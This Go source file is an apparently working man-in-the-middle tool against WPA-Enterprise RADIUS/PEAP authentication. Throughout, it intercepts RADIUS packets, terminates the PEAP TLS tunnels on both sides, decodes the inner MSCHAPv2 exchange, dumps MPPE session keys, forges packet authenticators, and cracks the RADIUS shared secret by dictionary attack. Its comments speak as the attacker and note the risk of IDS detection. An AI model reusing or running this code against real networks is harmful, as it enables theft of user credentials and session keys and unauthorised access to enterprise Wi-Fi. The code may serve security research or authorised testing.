package main

import (
	"crypto/rand"
	"encoding/binary"
	"encoding/hex"
	"flag"
	"fmt"
	"net"
	"radius/eap"
	"radius/radius"
	"radius/session"
)

//delayedTLSData struct to hold the TLS data that has been captured but cannot be forwarded because
//the handshake process has not been finished yet.
type delayedTLSData struct {
	tlsContent     []byte
	context        *session.ContextInfo
	peapPacket     *eap.EapPeap
	clientToServer bool
}

var delayedTLSChunks []delayedTLSData

const authPort = 1812
const accPort = 1813

const hostName = "169.254.63.10"

const wireless80211Port = 19

var mySession session.Session

func forwardOrDelayTLSData(tlsContent []byte, context *session.ContextInfo, peapPacket *eap.EapPeap, clientToServer bool) {

	tlsSession := context.GetTLSSession()

	tlsChunk := delayedTLSData{
		tlsContent:     tlsContent,
		context:        context,
		peapPacket:     peapPacket,
		clientToServer: clientToServer,
	}

	if (clientToServer && tlsSession.GetServerHandShakeStatus() > 2) || (!clientToServer && tlsSession.GetNASHandShakeStatus() > 2) {
		fmt.Println("TLS Data forwarded", clientToServer)
		onTLSData(tlsContent, context, peapPacket, clientToServer)
	} else {
		fmt.Println("TLS Data delayed", clientToServer)
		delayedTLSChunks = append(delayedTLSChunks, tlsChunk)
	}

}

func deliverDelayedTLSData(clientToServer bool) {

	i := 0

	for i < len(delayedTLSChunks) {

		if delayedTLSChunks[i].clientToServer == clientToServer {
			fmt.Println("TLS Data delivered", clientToServer)
			onTLSData(delayedTLSChunks[i].tlsContent, delayedTLSChunks[i].context,
				delayedTLSChunks[i].peapPacket,
				delayedTLSChunks[i].clientToServer)

			delayedTLSChunks = append(delayedTLSChunks[:i], delayedTLSChunks[i+1:]...)
		} else {
			i++
		}

	}

}

func manglePacket(manglePacket *radius.RadiusPacket, from net.UDPAddr, to net.UDPAddr, clientToServer bool) bool {

	var client, server net.UDPAddr

	forward := true

	//Determine client and server
	if clientToServer {
		client = from
		server = to
	} else {
		client = to
		server = from
	}

	if server.Port == accPort {
		return true //At the moment, we do not do anything for Accounting messages
	}

	fmt.Println()
	fmt.Println()
	fmt.Println()

	fmt.Println("¡¡¡PACKAGE RECEIVED!!!")

	//Print some useful information about the packet
	fmt.Println("Pck rcv from ", from, "to", to)
	fmt.Println("Code:", manglePacket.GetCode())
	fmt.Println("Id:", manglePacket.GetId())

	//Get the session context by means of the client address
	context := session.GetContextByClient(client)

	//Keep track of the current ID for received packets...
	if clientToServer {
		context.SetLastNASMsgId(manglePacket.GetId())
		context.SetLastAuthMsg(manglePacket.GetAuthenticator()) //Keep track also of the
	} else {
		context.SetLastServerMsgId(manglePacket.GetId())
	}

	if manglePacket.GetCode() == radius.AccessChallenge {

		//Now, we know the state attribute
		if ok, state := manglePacket.GetState(); ok {
			context.SetState(state)
		}

	}

	if manglePacket.GetCode() == radius.AccessRequest {

		//Retrieve basic information about the client
		//NAS Port Type
		if ok, nasPortType := manglePacket.GetNASPortType(); ok {
			context.SetNasPortType(nasPortType)

			if nasPortType == wireless80211Port {
				fmt.Println("WIFI network Authetication!!")

				//Set the current user name if not done before
				if ok, user := manglePacket.GetUserName(); ok {
					context.SetUserName(user)
				}

				//Set calling station
				if ok, callingSta := manglePacket.GetCallingSTAID(); ok {
					context.SetCallingStation(callingSta)
				}

			}

		}

		//NAS Port
		if ok, nasPort := manglePacket.GetNASPort(); ok {
			context.SetNasPort(nasPort)
		}

		//NAS IP
		if ok, nasIP := manglePacket.GetNASIp(); ok {
			context.SetNasIP(nasIP)
		}

		//Called STA
		if ok, calledSTA := manglePacket.GetCalledSTAID(); ok {
			context.SetCalledStation(calledSTA)
		}

		//Framed MTU
		if ok, framedMTU := manglePacket.GetFramedMTU(); ok {
			context.SetFramedMTU(framedMTU)
		}

		//Connect Info
		if ok, connectInfo := manglePacket.GetConnectInfo(); ok {
			context.SetConnectInfo(connectInfo)
		}

		//Acc Session
		if ok, accSession := manglePacket.GetAccountSession(); ok {
			context.SetAccSessionID(accSession)
		}

	}

	//TODO Detect Desired auth type method for EAP.

	//Check if there are EAP messages...

	if ok, eapMsg := manglePacket.GetEAPMessage(); ok {

		//fmt.Println("eapMsg:", eapMsg)

		var eapHeader eap.HeaderEap

		ok = eapHeader.Decode(eapMsg)

		if ok {
			fmt.Println("EAP Decode Code:", eapHeader.GetCode())
			fmt.Println("EAP Decode ID:", eapHeader.GetId())
			fmt.Println("EAP Decode Type:", eapHeader.GetType())
			fmt.Println("EAP Decode Length:", eapHeader.GetLength())

			//Success message. We need to modify some fields...
			if eapHeader.GetCode() == eap.EAPSuccess {
				eapHeader.SetId(context.GetLastNASEapId() + 1)

				if ok, encodedPEAP := eapHeader.Encode(); ok {
					manglePacket.SetEAPMessage(encodedPEAP)
					//If we receive a Access Accept message, recalculate the authenticator field to make it valid to the NAS.
					//We must also modify the IDs of the messages
					if manglePacket.GetCode() == radius.AccessAccept {

						//Obtain the MPPE keys
						if ok, rcvKey := manglePacket.GetMSMPPERecvKey(); ok {
							fmt.Println("Recv key")
							fmt.Println(hex.Dump(rcvKey))
						}

						if ok, sndKey := manglePacket.GetMSMPPESendKey(); ok {
							fmt.Println("Send key")
							fmt.Println(hex.Dump(sndKey))
						}

						manglePacket.SetId(context.GetLastNASMsgId())
						radius.RecalculateMsgAuth(manglePacket, context.GetLastAuthMsg(), context.GetSecret())

						if ok, auth := radius.CalculateResponseAuth(manglePacket, context.GetLastAuthMsg(), context.GetSecret()); ok {
							manglePacket.SetAuthenticator(auth)
						}

					}
				}
			}

			if eapHeader.GetCode() == eap.EAPRequest || eapHeader.GetCode() == eap.EAPResponse {
				eapPacket := eap.GetEAPByType(eapHeader.GetType())

				ok = eapPacket.Decode(eapMsg)

				if ok {
					fmt.Println("EAP decoded")

					//Keep track of the last EAP message ID
					if clientToServer {
						context.SetLastNASEapId(eapPacket.GetId())
					} else {
						context.SetLastServerEapId(eapPacket.GetId())
					}

					switch eapPacket.GetType() {
					case eap.Identity:
						identPacket := eapPacket.(*eap.EapIdentity)
						if manglePacket.GetCode() == radius.AccessRequest {
							context.SetEAPIdentity(identPacket.GetIdentity()) //Set EAP identity
						} else {

							fmt.Println("Eap identity not expected in this message")
						}
					case eap.LegacyNak:
						legacyNak := eapPacket.(*eap.EapNak)

						fmt.Println("Desired Eap method type to authenticate:", legacyNak.GetDesiredType())

						context.SetEapMethod(uint8(legacyNak.GetDesiredType())) //Set desired EAP method

					case eap.Peap:
						peapPacket := eapPacket.(*eap.EapPeap)
						//Set PEAP version
						context.SetPeapVersion(peapPacket.GetVersionFlag())

						if manglePacket.GetCode() == radius.AccessChallenge && peapPacket.GetCode() == eap.EAPRequest {
							forward = manageServerPeap(manglePacket, from, to, peapPacket, context, clientToServer)
						}

						//Manage client TLS Session
						if manglePacket.GetCode() == radius.AccessRequest && peapPacket.GetCode() == eap.EAPResponse {
							forward = manageNASPeap(manglePacket, from, to, peapPacket, context, clientToServer)
						}

					}
				}
			}

		}

	}

	//Used to determine if we have already the secret, because we have broken it or it is available in the database
	status := context.GetSecretStatus()

	//Check the status concerning the secret for the current context
	switch status {
	case session.SecretUnknown:
		fmt.Println("No secret")
		fmt.Println("Determine secret")
		mySession.GuessSecret(manglePacket.Clone(), client, server, clientToServer)

	case session.SecretOk:

	}

	context.PrintInfo()

	return forward

}

func manageServerPeap(manglePacket *radius.RadiusPacket, from net.UDPAddr, to net.UDPAddr, peapPacket *eap.EapPeap, context *session.ContextInfo, clientToServer bool) bool {

	if peapPacket.GetStartFlag() { //A TLS session is about to start
		fmt.Println("PEAP session about to start.")

		//Create a TLS session

		context.CreateTLSSession()

		tlsSession := context.GetTLSSession()

		rawTLSToServer := tlsSession.GetServerTunnel().ReadRaw()
		//rawTLSToServer := tlsSession.ServerReadRaw()

		fmt.Println("rawTLSToServer:", rawTLSToServer)

		//At this point, we start to manage the session. Send EAP response to server
		craftedPacket := craftPacketFromTLSPayload(context, rawTLSToServer, manglePacket.GetId()+1, peapPacket.GetId(), !clientToServer, [16]byte{})

		//Send crafted message
		mySession.SendPacket(craftedPacket, !clientToServer)

		//Update handshake status
		tlsSession.SetServerHandShakeStatus(1) //First handshake packet sent

		//Return true here, as we forward the packet so that the NAS Starts also a TLS session with us ;)
		return true
	}

	tlsPayload := peapPacket.GetTLSPayload()

	if len(tlsPayload) > 0 {

		tlsSession := context.GetTLSSession()

		if peapPacket.GetLengthFlag() {
			context.SetServerTLSLength(peapPacket.GetTLSTotalLength())
		}

		context.AddTLSServerPayload(tlsPayload)

		//Check whether we have the whole TLS packet or not.
		if peapPacket.GetMoreFlag() {

			fmt.Println("¡¡¡¡¡More frags detected from server!!!!!")

			//Send ACK Eap Message to the Server
			craftedPacket := craftPacketFromTLSPayload(context, nil, manglePacket.GetId()+1,
				peapPacket.GetId(), !clientToServer, [16]byte{})

			//Send crafted message
			mySession.SendPacket(craftedPacket, !clientToServer)

		} else {

			payload, length := context.GetAndDeleteServerTLSPayloadAndLength()

			if length != 0 && uint32(len(payload)) != length {
				fmt.Println("EAPMessage --> Length mismatch!! len(payload) -->", len(payload), "length -->", length)

			}

			tlsSession.GetServerTunnel().WriteRaw(payload)

			if tlsSession.GetServerHandShakeStatus() < 2 {

				rawPayload := tlsSession.GetServerTunnel().ReadRaw()

				//Send Eap Message with TLS handshake to the Server
				craftedPacket := craftPacketFromTLSPayload(context, rawPayload, manglePacket.GetId()+1,
					peapPacket.GetId(), !clientToServer, [16]byte{})

				//Send crafted message
				mySession.SendPacket(craftedPacket, !clientToServer)

				tlsSession.SetServerHandShakeStatus(2)

			} else if tlsSession.GetServerHandShakeStatus() == 2 {
				//We received the last TLS handshake message

				//Send ACK message to Server
				craftedPacket := craftPacketFromTLSPayload(context, nil, manglePacket.GetId()+1,
					peapPacket.GetId(), !clientToServer, [16]byte{})

				//Send crafted message
				mySession.SendPacket(craftedPacket, !clientToServer)

				tlsSession.SetServerHandShakeStatus(3)

				deliverDelayedTLSData(!clientToServer)
				fmt.Println("Handshake with server OK")

			} else {
				//TLS Payload to handle
				tlsContent := tlsSession.ReadTLSFromServer()

				forwardOrDelayTLSData(tlsContent, context, peapPacket, clientToServer)

			}

		}

	}

	//By default, do not forward the message
	return false

}

func manageNASPeap(manglePacket *radius.RadiusPacket, from net.UDPAddr, to net.UDPAddr, peapPacket *eap.EapPeap, context *session.ContextInfo, clientToServer bool) bool {

	tlsSession := context.GetTLSSession()

	if tlsSession == nil {
		return false // Peap session already started and we did not manage to create a session previously.
	}

	if !peapPacket.GetLengthFlag() && !peapPacket.GetMoreFlag() && !peapPacket.GetStartFlag() && len(peapPacket.GetTLSPayload()) == 0 {
		//Received Peap Ack message

		if tlsSession.GetNASHandShakeStatus() == 2 { //The handshake process has finished
			tlsSession.SetNASHandShakeStatus(3) //Ack from the client to tell us the TLS session succeded
			deliverDelayedTLSData(!clientToServer)

			fmt.Println("Handshake with NAS OK")
		}

		//As attacker, we decide to not split the Eap messages into different Radius packets. We avoid handling splitted Eap messages and therefore,
		//the reception of an ACK message should only happen after TLS handshake process has finished, but on the other side,
		//we are "signing" our attack that can be detected by IDS and algorithms of anomaly detection.

	}

	tlsPayload := peapPacket.GetTLSPayload()

	if len(tlsPayload) > 0 {

		if peapPacket.GetLengthFlag() {
			context.SetNASTLSLength(peapPacket.GetTLSTotalLength())
		}

		context.AddTLSNASPayload(tlsPayload)

		//Check whether we have the whole TLS packet or not.
		if peapPacket.GetMoreFlag() {

			//Send ACK Eap Message to the Client
			craftedPacket := craftPacketFromTLSPayload(context, nil, manglePacket.GetId(),
				peapPacket.GetId()+1, !clientToServer, manglePacket.GetAuthenticator())

			//Send crafted message
			mySession.SendPacket(craftedPacket, !clientToServer)

		} else {
			payload, length := context.GetAndDeleteNASTLSPayloadAndLength()

			if length != 0 && uint32(len(payload)) != length {
				fmt.Println("EAPMessage --> Length mismatch!! len(payload) -->", len(payload), "length -->", length)
			}

			tlsSession.GetNASTunnel().WriteRaw(payload)
			//tlsSession.NASWriteRaw(payload)

			//Check handshake status
			if tlsSession.GetNASHandShakeStatus() < 2 {

				//Start asynchronous read so that the TLS server side process the handshakes
				if tlsSession.GetNASHandShakeStatus() == 0 {
					tlsSession.GetNASTunnel().ReadTlsAsync()
				}

				//Read the handshake packet generated by the server
				rawResponse := tlsSession.GetNASTunnel().ReadRaw()
				fmt.Println("Read !!")

				//Send ACK Eap Message to the Client
				craftedPacket := craftPacketFromTLSPayload(context, rawResponse, manglePacket.GetId(),
					peapPacket.GetId()+1, !clientToServer, manglePacket.GetAuthenticator())

				//Send crafted message
				mySession.SendPacket(craftedPacket, !clientToServer)

				//Go to the following step
				tlsSession.SetNASHandShakeStatus(tlsSession.GetNASHandShakeStatus() + 1)

			} else if tlsSession.GetNASHandShakeStatus() == 3 {
				//First message after Handshake
				//Get the asynchronous data
				tlsContent := <-tlsSession.GetNASTunnel().GetReadTLSChannel()
				forwardOrDelayTLSData(tlsContent, context, peapPacket, clientToServer)
				tlsSession.SetNASHandShakeStatus(4)
			} else {

				tlsContent := tlsSession.GetNASTunnel().ReadTls()
				forwardOrDelayTLSData(tlsContent, context, peapPacket, clientToServer)

			}

		}

	}
	//Packet is not forwarded to the server. Otherwise, the server will be confused when processing legitimate packets and illicit ones.

	return false

}

func craftPacketFromTLSPayload(context *session.ContextInfo, payload []byte, msgID uint8, eapID uint8, clientToServer bool, authenticator [16]byte) *radius.RadiusPacket {

	//fmt.Println("Authenticator", hex.Dump(authenticator[:]))

	//fmt.Println("craftPacketFromTLSPayload Send packet")

	craftedPacket := radius.NewRadiusPacket()
	craftedPacket.SetId(msgID)

	eapMessage := eap.NewEapPeap()
	eapMessage.SetId(eapID)

	//Add TLS payload
	if payload != nil {
		eapMessage.SetTLSPayload(payload)
	}

	if clientToServer {

		craftedPacket.SetCode(radius.AccessRequest)
		eapMessage.SetCode(eap.EAPResponse)

		//Set NAS context into the packet
		craftedPacket.SetUserName(context.GetUserName())
		craftedPacket.SetNASIp(context.GetNasIP())
		craftedPacket.SetCalledSTAID(context.GetCalledStation())
		craftedPacket.SetNASPortType(context.GetNasPortType())
		craftedPacket.SetNASPort(context.GetNasPort())
		craftedPacket.SetCallingSTAID(context.GetCallingStation())
		craftedPacket.SetConnectInfo(context.GetConnectInfo())
		craftedPacket.SetAccountSession(context.GetAccSessionID())
		craftedPacket.SetFramedMTU(context.GetFramedMTU())

		//Generate random Authenticator

		_, err := rand.Read(authenticator[:])

		if err != nil {
			fmt.Println("Error in random function", err)
			return nil
		}

	} else {

		craftedPacket.SetCode(radius.AccessChallenge)
		eapMessage.SetCode(eap.EAPRequest)

	}

	if ok, encodedPEAP := eapMessage.Encode(); ok {
		craftedPacket.SetEAPMessage(encodedPEAP)
	}

	craftedPacket.SetState(context.GetState())

	//We need to recalculate this attribute, otherwise, the message will be rejected
	radius.RecalculateMsgAuth(craftedPacket, authenticator, context.GetSecret())

	//Calculate Response Authenticator for Access Challenge packets
	if craftedPacket.GetCode() == radius.AccessChallenge {
		if ok, auth := radius.CalculateResponseAuth(craftedPacket, authenticator, context.GetSecret()); ok {
			craftedPacket.SetAuthenticator(auth)
		}

	}

	return craftedPacket

}

//This method will receive the content of the TLS session in clear text, no ciphers
func onTLSData(tlsContent []byte, context *session.ContextInfo,
	outerPeapPckt *eap.EapPeap, clientToServer bool) {

	var eapHeader eap.HeaderEap

	fmt.Println("onTLSData. Data:")
	fmt.Println(hex.Dump(tlsContent))

	//Forward TLS data
	tlsSession := context.GetTLSSession()
	var rawContent []byte

	var lastMsgID, lastEapID byte

	var authenticator [16]byte

	if clientToServer {
		tlsSession.GetServerTunnel().WriteTls(tlsContent)
		rawContent = tlsSession.GetServerTunnel().ReadRaw()
		lastMsgID = context.GetLastServerMsgId() + 1
		lastEapID = context.GetLastServerEapId()
	} else {
		tlsSession.GetNASTunnel().WriteTls(tlsContent)
		rawContent = tlsSession.GetNASTunnel().ReadRaw()
		lastMsgID = context.GetLastNASMsgId()
		lastEapID = context.GetLastNASEapId() + 1
		authenticator = context.GetLastAuthMsg()
	}

	fmt.Println("Forwarding TLS. MSG ID: ", lastMsgID, ", EAP ID:", lastEapID)

	craftedPacket := craftPacketFromTLSPayload(context, rawContent, lastMsgID, lastEapID, clientToServer, authenticator)

	//Send crafted packet
	mySession.SendPacket(craftedPacket, clientToServer)

	//End forward TLS data

	//Start decoding the unencrypted phase 2 tunneled PEAP payload
	//The tunneled payload, which is in cleartext, contains also an EAP message
	//inside the tunneled EAP message a more insecure method is used, for example
	//MsCHAPv2 or GTC and so on.

	//Treat the case in which the header of EAP packet is not included
	//inside the tunnel, but rather the outer EAP header is reused.
	skipChange := false

	//PEAP version equals to 0 does not include the inner EAP header inside the tunnel.
	if context.GetPeapVersion() != 0 {
		skipChange = true
	}

	//If PEAP version = 0, check whether the method is identity.
	//In this case, the inner header is already included.
	if !skipChange && len(tlsContent) == 5 && eap.EapCode(tlsContent[0]) == eap.EAPRequest {
		if ok := eapHeader.Decode(tlsContent); ok {
			if eapHeader.GetType() == eap.Identity && eapHeader.GetLength() == 5 {
				skipChange = true
			}
		}
	}

	if !skipChange && len(tlsContent) >= 5 {
		if ok := eapHeader.Decode(tlsContent); ok {
			if eapHeader.GetType() == eap.TLV {
				skipChange = true
			}
		}

	}

	//Add the outer EAP message (phase 1, PEAP) header as the inner eap header.
	if !skipChange {

		header := make([]byte, 4)

		//Eap code
		header[0] = byte(outerPeapPckt.GetCode())
		//Eap ID (received Eap ID)
		header[1] = byte(outerPeapPckt.GetId())

		//Eap length = payload + 4 bytes appended at the beginning
		//which correspond with the outer PEAP header
		binary.BigEndian.PutUint16(header[2:], uint16(len(tlsContent))+4)
		tlsContent = append(header, tlsContent...)
	}

	fmt.Println("onTLSData. Treated data:")
	fmt.Println(hex.Dump(tlsContent))

	//Once we added the missing data, we can proceed to decode the tunneled EAP message.

	fmt.Println("Decoding inner EAP message")

	if ok := eapHeader.Decode(tlsContent); ok {
		fmt.Println("Inner EAP header decoded-->")
		fmt.Println("Code:", eapHeader.GetCode(), ", ID:", eapHeader.GetId())

		if eapHeader.GetCode() == eap.EAPRequest || eapHeader.GetCode() == eap.EAPResponse {
			fmt.Println("Method:", eapHeader.GetType())

			eapPacket := eap.GetEAPByType(eapHeader.GetType())

			if ok := eapPacket.Decode(tlsContent); ok {
				fmt.Println("Inner EAP Decoded")

				switch eapPacket.GetType() {
				case eap.MsChapv2:
					fmt.Println("Method MSChapv2")

					msChapv2Packet := eapPacket.(*eap.EapMSCHAPv2)

					manageMsChapV2(msChapv2Packet, context)

				case eap.TLV:
					fmt.Println("Method TLV result")

					tlvEap := eapPacket.(*eap.EapTLVResult)

					fmt.Println("Result:", tlvEap.GetResult())

				}
			}
		}
	}

	//End decoding tunneled data

}

func manageMsChapV2(packet *eap.EapMSCHAPv2, context *session.ContextInfo) {

	fmt.Println("MSChapv2 MsID:", packet.GetMsgID())

	if packet.GetName() != "" {
		fmt.Println("MSChapv2 Name:", packet.GetName())
	}

	switch packet.GetOpCode() {
	case eap.MsChapV2Challenge: //Server sends a challenge request
		fmt.Println("Received auth challenge:")
		fmt.Println(hex.Dump(packet.GetAuthChallenge()))

		context.SetMsChapV2AuthChallenge(packet.GetAuthChallenge())

	case eap.MsChapV2Response: //Peer sends a challenge response
		fmt.Println("Received response")
		peerChallenge, ntResponse, _ := eap.MSCHAPv2ExtractFromResponse(packet.GetResponse())

		fmt.Println("Peer challenge")
		fmt.Println(hex.Dump(peerChallenge))

		context.SetMsChapV2PeerChallenge(peerChallenge)

		fmt.Println("NT-Response")
		fmt.Println(hex.Dump(ntResponse))

		context.SetMsChapV2NTResponse(ntResponse)

		fmt.Println("Generating local NT-Response from intercepted data")

		calculatedResponse := eap.MsChapV2GenerateNTResponse(context.GetMsChapV2AuthChallenge(), context.GetMsChapV2PeerChallenge(), context.GetUserName(), "password")

		fmt.Println("Local NT-Response:")

		fmt.Println(hex.Dump(calculatedResponse))

		fmt.Println("Calculating Master key")

		masterKey := eap.MsChapV2GetMasterKeyFromPsswd("password", ntResponse)

		fmt.Println("Calculated Master Key:")
		fmt.Println(hex.Dump(masterKey))

		fmt.Println("Calculating Send key")

		sendKey := eap.MsChapV2GetSendKey(masterKey)
		fmt.Println("Calculated Send Key:")
		fmt.Println(hex.Dump(sendKey))

		fmt.Println("Calculating Receive key")

		receiveKey := eap.MsChapV2GetReceiveKey(masterKey)
		fmt.Println("Calculated Receive Key:")
		fmt.Println(hex.Dump(receiveKey))

	case eap.MsChapV2Success:

		if packet.GetCode() == eap.EAPRequest { //Server sends a success request

			fmt.Println("Received Success request")
			fmt.Println("Message from server:", packet.GetMessage())

			context.SetServerMessage(packet.GetMessage())

			//Calculate ourselves the result of the message field

			calcMessage := eap.MsChapV2GenerateAuthenticatorResponse("password", context.GetMsChapV2NTResponse(),
				context.GetMsChapV2PeerChallenge(), context.GetMsChapV2AuthChallenge(), context.GetUserName())

			fmt.Println("Calculated message:", calcMessage)

		}

	}

}

func main() {

	secrets := flag.String("secrets", "secrets.txt", "Secrets file to perform dictionary attacks")

	active := flag.Bool("active", false, "When activated, communications will be intercepted, otherwise, we only forward packets")

	flag.Parse()

	session.SetConfig(*secrets)

	//Init session

	mode := session.Passive

	if *active {
		mode = session.Active
	}

	mySession.Init(mode, hostName, authPort, accPort)

	mySession.Hijack(manglePacket)
}
